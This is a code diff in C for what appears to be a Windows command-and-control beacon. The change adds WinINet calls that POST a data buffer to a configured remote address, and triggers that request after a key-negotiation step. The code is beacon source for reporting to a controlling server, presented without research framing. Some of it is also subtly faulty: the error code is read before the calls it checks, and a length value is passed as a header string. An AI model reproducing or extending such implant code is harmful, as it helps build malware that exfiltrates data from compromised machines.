@@ -108,15 +108,31 @@ void process_command(CHAR* command, CHAR* input) {
 }
 
 void http_request() {
-    //HINTERNET h_internet;
-    //HINTERNET h_connect;
-    //HINTERNET h_request;
+    HINTERNET h_internet;
+    HINTERNET h_connect;
+    HINTERNET h_request;
     CHAR* response = NULL;
     //CHAR* query_buffer = NULL;
-    //DWORD dw_error = GetLastError();
+    DWORD dw_error = GetLastError();
 
-    log_debug("Sending request for ", data.status);
+    log_debug("Sending request for %d", data.status);
     beacon.count++;
+
+    h_internet = InternetOpenA(transport.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+
+    h_connect = InternetConnectA(h_internet, http.address, http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
+
+    h_request = HttpOpenRequestA(h_connect, "POST", transport.path, 0, 0, 0, 0, 0);
+
+    if (h_internet == NULL || h_connect == NULL || h_request == NULL) {
+        log_error("Error: %lu\n", dw_error);
+        goto cleanup;
+    } else {
+        HttpAddRequestHeadersA(h_request, data.length, -1, HTTP_ADDREQ_FLAG_ADD);
+        HttpSendRequestA(h_request, 0, 0, data.buffer, data.size);
+
+        log_debug("Request sent");
+    }
 
     goto process_response;
 
@@ -278,6 +294,8 @@ void negotiate_key(CHAR* keyword) {
     package(buffer);
 
     log_info("Buffer: %s", buffer); 
+
+    http_request();
 
     goto clean_memory;
     clean_memory:
